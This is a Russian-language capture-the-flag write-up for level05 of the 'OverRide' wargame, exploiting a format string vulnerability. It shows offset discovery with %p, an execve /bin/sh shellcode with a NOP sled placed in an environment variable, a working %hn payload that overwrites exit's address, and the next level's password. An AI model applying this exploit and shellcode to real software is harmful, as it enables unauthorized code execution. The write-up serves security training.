Уязвимость форматной строки.
Судя по поведению, программа всё выводит под младшим регистром.
Больше ничего не делает.  Используется fgets, который не имеет уязвимости переполнения.

Если отправить спецификатор строки %s, то получаем сегу:

(gdb) r
Starting program: /home/users/level05/level05
ABCD %s

Program received signal SIGSEGV, Segmentation fault.
0xf7e7082e in vfprintf () from /lib32/libc.so.6

Если отправить аргументы букв и спецификатор указателя, то найдём смещение:
level05@OverRide:~$ ./level05
AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p

aaaa0x640xf7fcfac0(nil)(nil)(nil)(nil)0xffffffff0xffffd7440xf7fdb0000x616161610x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70257025

на 10-м месте увидим наши 4 буквы "А", а затем адрес спецификатора %p, который показывает адреса значений в стэке в формате указателя.
Это значит, что после 10-го адреса заканчивается результат функции printf и дальше идёт exit(argument).

Проверим, подав в качестве аргумента четыре буквы B и указав показать через спецификатор %c
что находится на 10-м месте.

level05@OverRide:~$ ./level05
BBBB%10$c
bbbbb
И тут мы подали 4 буквы В, а вышло 5, т.к. %c вывел нам по адресу смещения что находится на 10-ой позиции.
Соответственно, можно сюда закинуть shellcode.

В 32-х битной системе каждый адрес может содержать 4 байта. Можно закинуть туда shellcode,
однако shellcode не поместится. Чтобы его сократить, можно воспользоваться переменными
окружения.

Здесь нам необходимо воспользоваться готовым shellcode, чтобы запустить в памяти
наш /bin/sh:

http://shell-storm.org/shellcode/files/shellcode-827.php
Выкладываем наш ShellCode в переменные окружения
export SHELLCODE=`python -c 'print("\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`

x90 это nope, а 100000 это дойти до конца стэка и закинуть наш Shellcode. В Shellcode закидываются данные
из переменных в стэк, а затем заполняется адресом execve и bin/sh для выполнения и выход с.

Помещаем затем наш shellcode по 10 и 11 адресам соответственно.
Дальше по 10 и 11 адресам exit помещаем адреса стэка для выполнения Shellcode-a:
cat <(python -c 'print ("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%249x%10$hn" + "%65278x%11$hn")') - | ./level05

cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq